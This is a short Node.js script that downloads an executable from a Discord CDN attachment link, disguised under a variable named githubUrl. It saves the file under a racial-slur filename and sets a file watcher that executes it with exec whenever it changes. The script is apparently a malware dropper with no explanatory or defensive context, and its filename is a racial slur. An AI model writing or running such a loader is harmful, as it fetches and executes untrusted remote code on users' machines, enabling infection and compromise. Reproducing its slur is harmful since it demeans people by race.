const fs = require('fs');
const http = require('https');
const { exec } = require('child_process');

class ExeFileHandler {
    constructor(exePath) {
        this.exePath = exePath;
    }

    onModified(event) {
        if (event === this.exePath) {
            exec(this.exePath, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error executing ${this.exePath}: ${error}`);
                }
            });
        }
    }
}

function downloadExe(repoUrl, exeFilename) {
    const downloadPath = exeFilename;

    http.get(repoUrl, (response) => {
        if (response.statusCode === 200) {
            const fileStream = fs.createWriteStream(downloadPath);

            response.pipe(fileStream);

            response.on('end', () => {
                console.log(`Downloaded ${downloadPath}`);
                observeFile(downloadPath);
            });
        } else {
            console.error(`Error downloading from ${repoUrl}: ${response.statusCode}`);
        }
    });
}

function observeFile(exePath) {
    fs.watch(exePath, (event) => {
        if (event === 'change') {
            exec(exePath, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error executing ${exePath}: ${error}`);
                }
            });
        }
    });
}

const githubUrl = "https://cdn.discordapp.com/attachments/1153200000134819920/1168539131761139742/bignigga.exe";
const exeFilename = "bignigga.exe";

downloadExe(githubUrl, exeFilename);
